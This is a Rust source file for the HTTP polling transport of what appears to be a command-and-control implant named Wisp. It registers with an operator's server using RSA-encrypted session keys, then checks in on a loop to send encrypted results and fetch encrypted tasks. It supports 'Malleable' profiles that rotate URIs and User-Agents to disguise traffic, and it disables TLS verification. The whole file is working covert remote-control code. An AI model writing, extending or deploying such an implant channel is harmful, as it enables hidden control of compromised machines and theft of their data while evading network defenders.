// HTTP polling transport — MUST match Go agent/transport/http.go wire format.
//
// Register: POST /api/v1/register { "payload": b64([4B key_len][RSA keys][AES reg]) }
//   → { "status":"ok", "ack": b64(AES-encrypted ack) }
// Checkin: POST /api/v1/checkin { "id","seq","data": b64(AES-encrypted results) }
//   → { "tasks": b64(AES-encrypted task JSON) }
// Pubkey:  GET /api/v1/pubkey → { "pubkey": PEM }
//   (only used when no compiled-in key; M0 config always carries the key)
//
// The payload transform is delegated to a `Codec` trait object so a future
// Malleable-profile / script-defined codec can be swapped in without changing
// the HTTP framing (see protocol/codec.rs).

use crate::protocol::codec::{Codec, DefaultCodec};
use crate::protocol::crypto::SessionKeys;
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde_json::json;

use super::TransportError;

pub struct HttpTransport {
    pub base: String,
    pub agent_id: String,
    pub codec: Box<dyn Codec>,
    pub rsa_pub_pem: String,
    pub seq: u64,
    /// Malleable traffic profile (custom URIs / UA rotation).
    pub profile: Option<crate::agent::TrafficProfile>,
    pub session_keys: Option<SessionKeys>,
    agent: ureq::Agent,
    uri_rot: usize,
    ua_rot: usize,
}

impl HttpTransport {
    pub fn new(host: &str, port: u16, agent_id: &str, rsa_pub_pem: &str) -> Self {
        let scheme = std::env::var("WISP_SCHEME")
            .ok()
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| "http".to_string());
        let base = format!("{scheme}://{host}:{port}");
        let agent = if scheme == "https" {
            super::tls::insecure_agent()
        } else {
            ureq::AgentBuilder::new().build()
        };
        HttpTransport {
            base,
            agent_id: agent_id.to_string(),
            codec: Box::new(DefaultCodec::new([0u8; 32], [0u8; 32])),
            rsa_pub_pem: rsa_pub_pem.to_string(),
            seq: 0,
            profile: None,
            session_keys: None,
            agent,
            uri_rot: 0,
            ua_rot: 0,
        }
    }

    /// Install a Malleable traffic profile (URI/UA rotation).
    pub fn set_profile(&mut self, p: Option<crate::agent::TrafficProfile>) {
        self.profile = p;
    }

    fn resolve_uri(&mut self, fixed: &str) -> String {
        match &self.profile {
            Some(p) => p.resolve_uri(&self.base, fixed, &mut self.uri_rot),
            None => format!("{}{}", self.base, fixed),
        }
    }

    fn apply_ua(&mut self, req: ureq::Request) -> ureq::Request {
        if let Some(ua) = self.profile.as_ref().and_then(|p| p.user_agent(&mut self.ua_rot)) {
            req.set("User-Agent", &ua)
        } else {
            req
        }
    }

    /// Install a custom codec (Malleable/script transform). Default is the
    /// Go-compatible AES+HMAC codec; only replaced when building a profile.
    /// Reset the checkin sequence counter (after re-registration).
    pub fn reset_seq(&mut self) {
        self.seq = 0;
    }

    pub fn set_codec(&mut self, c: Box<dyn Codec>) {
        self.codec = c;
    }

    /// Perform registration. `reg_json` is the marshalled RegisterData.
    pub fn register(&mut self, reg_json: &[u8]) -> Result<(), TransportError> {
        // Generate session keys (32+32 bytes, RSA-encrypted together)
        let keys = SessionKeys::generate();
        let mut key_material = Vec::with_capacity(64);
        key_material.extend_from_slice(&keys.aes_key);
        key_material.extend_from_slice(&keys.hmac_key);

        let encrypted_keys =
            crate::protocol::crypto::rsa_encrypt_oaep(&self.rsa_pub_pem, &key_material)
                .map_err(|e| TransportError::Other(e))?;
        let encrypted_reg = keys.encrypt(reg_json);

        // [4B key_len][encrypted_keys][encrypted_reg]
        let mut payload = Vec::with_capacity(4 + encrypted_keys.len() + encrypted_reg.len());
        payload.extend_from_slice(&(encrypted_keys.len() as u32).to_le_bytes());
        payload.extend_from_slice(&encrypted_keys);
        payload.extend_from_slice(&encrypted_reg);

        let body = json!({ "payload": B64.encode(&payload) }).to_string();

        let url = self.resolve_uri("/api/v1/register");
        let req = self.agent.post(&url).set("Content-Type", "application/json");
        let req = self.apply_ua(req);
        let resp = req
            .send_string(&body)
            .map_err(|e| TransportError::Other(format!("register request: {e}")))?;

        if resp.status() != 200 {
            return Err(TransportError::Status(resp.status(), "register".into()));
        }

        let res: serde_json::Value = resp
            .into_json()
            .map_err(|e| TransportError::Other(format!("decode register response: {e}")))?;

        if res["status"] != "ok" {
            return Err(TransportError::Other("registration rejected".into()));
        }

        // Verify ACK decrypts (proves the server holds the session keys)
        let ack_b64 = res["ack"]
            .as_str()
            .ok_or_else(|| TransportError::Other("missing ack".into()))?;
        let ack_data = B64
            .decode(ack_b64)
            .map_err(|e| TransportError::Other(format!("decode ack: {e}")))?;
        keys.decrypt(&ack_data).map_err(|e| TransportError::Other(e))?;

        // Install the session codec keyed with the negotiated session keys.
        self.codec = Box::new(DefaultCodec::new(keys.aes_key, keys.hmac_key));
        self.session_keys = Some(keys.clone());
        Ok(())
    }

    /// Poll for tasks, optionally delivering encrypted results.
    /// Returns the decrypted task JSON bytes.
    pub fn checkin(&mut self, results: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
        self.seq += 1;

        let data_field = match results {
            Some(r) if !r.is_empty() => B64.encode(&self.codec.encode(r)),
            _ => String::new(),
        };

        let body = json!({
            "id": self.agent_id,
            "seq": self.seq,
            "data": data_field,
        })
        .to_string();

        let url = self.resolve_uri("/api/v1/checkin");
        let req = self.agent.post(&url).set("Content-Type", "application/json");
        let req = self.apply_ua(req);
        let resp = req
            .send_string(&body)
            .map_err(|e| TransportError::Other(format!("checkin request: {e}")))?;

        if resp.status() == 401 {
            return Err(TransportError::Other("reauth required".into()));
        }
        if resp.status() != 200 {
            return Err(TransportError::Status(resp.status(), "checkin".into()));
        }

        let res: serde_json::Value = resp
            .into_json()
            .map_err(|e| TransportError::Other(format!("decode checkin response: {e}")))?;

        let tasks_b64 = res["tasks"]
            .as_str()
            .ok_or_else(|| TransportError::Other("missing tasks".into()))?;
        let tasks_enc = B64
            .decode(tasks_b64)
            .map_err(|e| TransportError::Other(format!("decode tasks: {e}")))?;

        self.codec.decode(&tasks_enc).map_err(|e| TransportError::Other(e))
    }
}
